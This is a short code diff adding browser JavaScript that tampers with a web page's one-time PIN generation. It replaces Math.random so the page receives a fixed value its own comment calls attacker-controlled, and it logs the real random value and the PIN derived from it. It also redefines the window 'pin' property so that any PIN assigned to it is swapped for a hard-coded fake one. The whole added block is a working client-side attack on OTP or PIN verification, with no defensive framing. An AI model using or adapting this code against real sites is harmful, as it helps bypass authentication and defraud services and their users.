@@ -74,3 +74,41 @@ Object.defineProperty(window, 'pin', {
         return window.interceptedOTP;
     }
 });
+
+
+
+
+// Step 1: Store the original Math.random
+const originalRandom = Math.random;
+
+// Step 2: Hook Math.random to log real decimal and calculated PIN
+let realRandomValue = null;
+let calculatedRealPIN = null;
+
+Math.random = function () {
+    realRandomValue = originalRandom(); // Actual random decimal
+    calculatedRealPIN = Math.floor(10000000 + realRandomValue * 90000000);
+    console.log("✅ Real Math.random decimal:", realRandomValue);
+    console.log("🔍 Original PIN ID (generated from real random):", calculatedRealPIN);
+    return 0.12345678; // Fake attacker-controlled value
+};
+
+// Step 3: Intercept and override the 'pin' variable
+Object.defineProperty(window, 'pin', {
+    set(value) {
+        const fakePIN = 21111110;
+
+        // Only log if calculatedRealPIN is available
+        if (calculatedRealPIN !== null) {
+            console.log(`🚨 Replacing original PIN ID (${calculatedRealPIN}) with fake PIN ID (${fakePIN})`);
+        } else {
+            console.log(`🚨 Setting fake PIN ID (${fakePIN}) without real PIN context`);
+        }
+
+        window.interceptedOTP = fakePIN;
+    },
+    get() {
+        return window.interceptedOTP;
+    }
+});
+
